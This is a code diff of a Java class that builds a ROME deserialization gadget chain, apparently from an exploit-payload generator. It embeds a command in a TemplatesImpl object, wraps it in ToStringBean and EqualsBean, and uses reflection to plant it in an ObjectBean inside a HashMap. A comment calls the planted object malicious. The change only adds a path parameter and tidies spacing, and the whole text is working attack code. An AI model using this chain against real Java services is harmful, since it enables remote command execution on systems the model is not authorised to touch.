@@ -14,8 +14,8 @@ import java.util.Map;
 
 public class Rome implements Gadget {
     @Override
-    public Object getObject(String command) throws Exception {
-        TemplatesImpl tmpl = TemplateUtils.getTemplate(command);
+    public Object getObject(String command, String path) throws Exception {
+        TemplatesImpl tmpl = TemplateUtils.getTemplate(command, path);
         ToStringBean toStringBean = new ToStringBean(Templates.class, tmpl);
         EqualsBean equalsBean = new EqualsBean(toStringBean.getClass(), toStringBean);
 
@@ -23,12 +23,12 @@ public class Rome implements Gadget {
         ObjectBean objectBean = new ObjectBean("".getClass(), "aaa");
 
         Map map = new HashMap<>();
-        map.put(objectBean,"asdf");
+        map.put(objectBean, "asdf");
 
         //将恶意的EqualsBean对象写入到ObjectBean的_equalsBean属性中
         Field equalsBean1 = objectBean.getClass().getDeclaredField("_equalsBean");
         equalsBean1.setAccessible(true);
-        equalsBean1.set(objectBean,equalsBean);
+        equalsBean1.set(objectBean, equalsBean);
         return map;
     }
 }
